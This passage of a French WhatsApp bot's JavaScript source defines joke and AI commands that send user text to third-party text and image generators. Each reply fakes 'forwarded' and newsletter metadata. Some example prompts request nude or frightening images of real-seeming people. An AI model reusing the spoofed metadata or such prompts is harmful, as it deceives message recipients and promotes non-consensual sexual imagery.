          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'ou': {
if (!text) return replygckev(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Ou ${text}*\nReponse : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'comment': {
            	if (!text) return replygckev(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*Comment ${text}*\nReponse : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'noter': {
            	if (!text) return replygckev(`Exemple : ${prefix + command} la beautey de tonton Kev`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Note De ${text}*\nReponse : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'definir': 
if (!q) return replygckev(`Que voulez-vous definir?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygckev(mess.error)
const reply = `
*${themeemoji} Mot:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Exemple:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygckev(`*${q}* isn't a valid text`)
    }
    break
    case 'boitenoire-ai': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} Ecrivez un programme pour me faire etre aimee de toutes`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/blackbox-ai?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Tonton Kev AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'travel-assistant': {
	if (!text) return replygckev(`*• Exmple:* ${prefix + command} comment puis-je visiter la chambre de ma meuf`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/copilot2trip?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Kev Travel Assistant AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'dalle': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} les tofs de mon pote black killer j aimerais effrayer quelqu un avec`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/dalle?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Kev Dalle\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'guru-ai': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} Comment me les faire toutes ?`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/degreeGuru?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Sylvers AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'emi-ai': {
	if (!text) return replygckev(`*• Example:* ${prefix + command} les nudes de himiko. J ai pensey a elle parce que l ia est emi`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/emi?prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'kev-ai': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} comment m epiler sabs avoir une erection`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/claude?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Kev AI\n\n${gpt.result.response}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break 
    case 'hercai-cartoon': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} ma meuf habillee en rockstar`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=v3&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Cartoon\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'hercai-animefy': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} ma meuf et moi nous tenant main dans la main`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=animefy&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Animefy\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'hercai-lexica': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} model photo`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=lexica&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Lexica\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'hercai-prodia': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} model photo`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=prodia&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Prodia\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'hercai-simurg': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} model photo`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=simurg&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Simurg\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'hercai-raava': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} model photo`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=raava&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Raava\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'hercai-shonin': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} model photo`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/hercai-img?model=shonin&prompt=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> Sylvers AI Shonin\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.data.response }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replygckev("`*Erreur*`")
}
}
    break
    case 'realiste': case '3dmodel': {
    	if (!text) return replygckev(`*Exemple:* ${prefix + command} ciel bleu`)
    let lastUsed = 0;
  let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) return replygckev("Cooldown 10 seconds, reessayez plus tard")
  lastUsed = currentTime;
  try {
    let negative = 'ugly, deformed, noisy, blurry, distorted, out of focus, bad anatomy, extra limbs, poorly drawn face, poorly drawn hands, missing fingers, adult, naked, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} Sylver AI\n\n_*Voici le resultat de: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: Kev.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Mbieng  👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygckev("`GPT Ne repond pas`")
  }
}
break
case 'photoleap': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} mer bleu`);
  let currentTime = Date.now();
  let lastUsed = 0;
  if (currentTime - lastUsed < 10000) return replygckev("Cooldown 10 seconds, reessayezplus tard");
  lastUsed = currentTime;
  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Sylvers AI\n\n' + text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result_url } }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await Kev.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return replygckev("`*Erreur*`");
  }
}
break
case 'ai': case 'gpt': case 'openai': {
	if (!text) return replygckev(`*• Exemple:* ${prefix + command} une technique pour que himoko tombe finalement amoureuse`);   
        try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt?model=gpt-4&q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
